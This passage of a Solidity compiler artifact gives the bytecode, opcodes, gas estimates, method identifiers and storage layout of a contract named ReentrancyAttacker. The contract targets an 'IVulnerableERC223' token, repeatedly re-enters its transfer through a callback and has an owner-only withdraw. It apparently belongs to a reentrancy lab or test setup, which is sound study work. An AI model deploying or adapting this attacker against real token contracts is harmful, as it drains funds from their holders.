5f6107c260098361077e565b91506107cd8261078e565b602082019050919050565b5f6020820190508181035f8301526107ef816107b6565b9050919050565b5f82825260208201905092915050565b50565b5f6108145f836107f6565b915061081f82610806565b5f82019050919050565b7f746f6b656e43616c6c6261636b28616464726573732c75696e743235362c62795f8201527f7465732900000000000000000000000000000000000000000000000000000000602082015250565b5f61088360248361077e565b915061088e82610829565b604082019050919050565b5f6080820190506108ac5f8301856106e2565b6108b96020830184610531565b81810360408301526108ca81610809565b905081810360608301526108dd81610877565b90509392505050565b5f8115159050919050565b6108fa816108e6565b8114610904575f80fd5b50565b5f81519050610915816108f1565b92915050565b5f602082840312156109305761092f610559565b5b5f61093d84828501610907565b91505092915050565b5f8151905061095481610561565b92915050565b5f6020828403121561096f5761096e610559565b5b5f61097c84828501610946565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6109bc82610528565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036109ee576109ed610985565b5b60018201905091905056fea2646970667358221220a933c51e4d3550d8a8d4e590f267385cc290950180bbeddd8fc5036d4b8e6f5a64736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xB7B CODESIZE SUB DUP1 PUSH2 0xB7B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x114 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x13F JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3 DUP3 PUSH2 0xBA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF3 DUP2 PUSH2 0xD9 JUMP JUMPDEST DUP2 EQ PUSH2 0xFD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x10E DUP2 PUSH2 0xEA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x129 JUMPI PUSH2 0x128 PUSH2 0xB6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x136 DUP5 DUP3 DUP6 ADD PUSH2 0x100 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xA2F DUP1 PUSH2 0x14C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x7B JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6BE32E73 GT PUSH2 0x59 JUMPI DUP1 PUSH4 0x6BE32E73 EQ PUSH2 0xC3 JUMPI DUP1 PUSH4 0x8C59507C EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xFD JUMPI DUP1 PUSH4 0xFC0C546A EQ PUSH2 0x11B JUMPI PUSH2 0x7B JUMP JUMPDEST DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x7F JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x89 JUMPI DUP1 PUSH4 0x64DD891A EQ PUSH2 0xA7 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x87 PUSH2 0x139 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x91 PUSH2 0x22F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x9E SWAP2 SWAP1 PUSH2 0x540 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xBC SWAP2 SWAP1 PUSH2 0x58B JUMP JUMPDEST PUSH2 0x235 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xDD PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xD8 SWAP2 SWAP1 PUSH2 0x671 JUMP JUMPDEST PUSH2 0x370 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xE7 PUSH2 0x4DA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xF4 SWAP2 SWAP1 PUSH2 0x540 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x105 PUSH2 0x4E0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x112 SWAP2 SWAP1 PUSH2 0x6F1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x123 PUSH2 0x505 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x130 SWAP2 SWAP1 PUSH2 0x765 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1C8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1BF SWAP1 PUSH2 0x7D8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x22C JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x2C4 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2BB SWAP1 PUSH2 0x7D8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x3 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF6368F8A ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x32C SWAP3 SWAP2 SWAP1 PUSH2 0x899 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x348 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x36C SWAP2 SWAP1 PUSH2 0x91B JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0xA PUSH1 0x2 SLOAD LT DUP1 ISZERO PUSH2 0x41A JUMPI POP PUSH1 0x3 SLOAD PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3D8 SWAP2 SWAP1 PUSH2 0x6F1 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x3F3 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x417 SWAP2 SWAP1 PUSH2 0x95A JUMP JUMPDEST LT ISZERO JUMPDEST ISZERO PUSH2 0x4D4 JUMPI PUSH1 0x2 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x431 SWAP1 PUSH2 0x9B2 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF6368F8A ADDRESS PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x492 SWAP3 SWAP2 SWAP1 PUSH2 0x899 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4AE JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x4D2 SWAP2 SWAP1 PUSH2 0x91B JUMP JUMPDEST POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x53A DUP2 PUSH2 0x528 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x553 PUSH0 DUP4 ADD DUP5 PUSH2 0x531 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x56A DUP2 PUSH2 0x528 JUMP JUMPDEST DUP2 EQ PUSH2 0x574 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x585 DUP2 PUSH2 0x561 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5A0 JUMPI PUSH2 0x59F PUSH2 0x559 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x5AD DUP5 DUP3 DUP6 ADD PUSH2 0x577 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5DF DUP3 PUSH2 0x5B6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5EF DUP2 PUSH2 0x5D5 JUMP JUMPDEST DUP2 EQ PUSH2 0x5F9 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x60A DUP2 PUSH2 0x5E6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x631 JUMPI PUSH2 0x630 PUSH2 0x610 JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x64E JUMPI PUSH2 0x64D PUSH2 0x614 JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x1 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0x66A JUMPI PUSH2 0x669 PUSH2 0x618 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 DUP1 PUSH1 0x60 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x689 JUMPI PUSH2 0x688 PUSH2 0x559 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x696 DUP8 DUP3 DUP9 ADD PUSH2 0x5FC JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x6A7 DUP8 DUP3 DUP9 ADD PUSH2 0x577 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x6C8 JUMPI PUSH2 0x6C7 PUSH2 0x55D JUMP JUMPDEST JUMPDEST PUSH2 0x6D4 DUP8 DUP3 DUP9 ADD PUSH2 0x61C JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH2 0x6EB DUP2 PUSH2 0x5D5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x704 PUSH0 DUP4 ADD DUP5 PUSH2 0x6E2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x72D PUSH2 0x728 PUSH2 0x723 DUP5 PUSH2 0x5B6 JUMP JUMPDEST PUSH2 0x70A JUMP JUMPDEST PUSH2 0x5B6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x73E DUP3 PUSH2 0x713 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x74F DUP3 PUSH2 0x734 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x75F DUP2 PUSH2 0x745 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x778 PUSH0 DUP4 ADD DUP5 PUSH2 0x756 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F74206F776E65720000000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x7C2 PUSH1 0x9 DUP4 PUSH2 0x77E JUMP JUMPDEST SWAP2 POP PUSH2 0x7CD DUP3 PUSH2 0x78E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x7EF DUP2 PUSH2 0x7B6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x814 PUSH0 DUP4 PUSH2 0x7F6 JUMP JUMPDEST SWAP2 POP PUSH2 0x81F DUP3 PUSH2 0x806 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x746F6B656E43616C6C6261636B28616464726573732C75696E743235362C6279 PUSH0 DUP3 ADD MSTORE PUSH32 0x7465732900000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x883 PUSH1 0x24 DUP4 PUSH2 0x77E JUMP JUMPDEST SWAP2 POP PUSH2 0x88E DUP3 PUSH2 0x829 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x8AC PUSH0 DUP4 ADD DUP6 PUSH2 0x6E2 JUMP JUMPDEST PUSH2 0x8B9 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x531 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x40 DUP4 ADD MSTORE PUSH2 0x8CA DUP2 PUSH2 0x809 JUMP JUMPDEST SWAP1 POP DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x8DD DUP2 PUSH2 0x877 JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8FA DUP2 PUSH2 0x8E6 JUMP JUMPDEST DUP2 EQ PUSH2 0x904 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x915 DUP2 PUSH2 0x8F1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x930 JUMPI PUSH2 0x92F PUSH2 0x559 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x93D DUP5 DUP3 DUP6 ADD PUSH2 0x907 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x954 DUP2 PUSH2 0x561 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x96F JUMPI PUSH2 0x96E PUSH2 0x559 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x97C DUP5 DUP3 DUP6 ADD PUSH2 0x946 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x9BC DUP3 PUSH2 0x528 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x9EE JUMPI PUSH2 0x9ED PUSH2 0x985 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA9 CALLER 0xC5 0x1E 0x4D CALLDATALOAD POP 0xD8 0xA8 0xD4 0xE5 SWAP1 CALLCODE PUSH8 0x385CC290950180BB 0xED 0xDD DUP16 0xC5 SUB PUSH14 0x4B8E6F5A64736F6C634300081A00 CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "521400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack(uint256)": "infinite",
						"attackCount()": "2448",
						"attackValue()": "2447",
						"owner()": "2552",
						"token()": "infinite",
						"tokenCallback(address,uint256,bytes)": "infinite",
						"withdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(uint256)": "64dd891a",
					"attackCount()": "407c2821",
					"attackValue()": "8c59507c",
					"owner()": "8da5cb5b",
					"token()": "fc0c546a",
					"tokenCallback(address,uint256,bytes)": "6be32e73",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 25,
						"contract": "contracts/ReentrancyAttacker.sol:ReentrancyAttacker",
						"label": "token",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IVulnerableERC223)22"
					},
					{
						"astId": 27,
						"contract": "contracts/ReentrancyAttacker.sol:ReentrancyAttacker",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 29,
						"contract": "contracts/ReentrancyAttacker.sol:ReentrancyAttacker",
						"label": "attackCount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 31,
						"contract": "contracts/ReentrancyAttacker.sol:ReentrancyAttacker",
						"label": "attackValue",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(IVulnerableERC223)22": {
						"encoding": "inplace",
						"label": "contract IVulnerableERC223",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}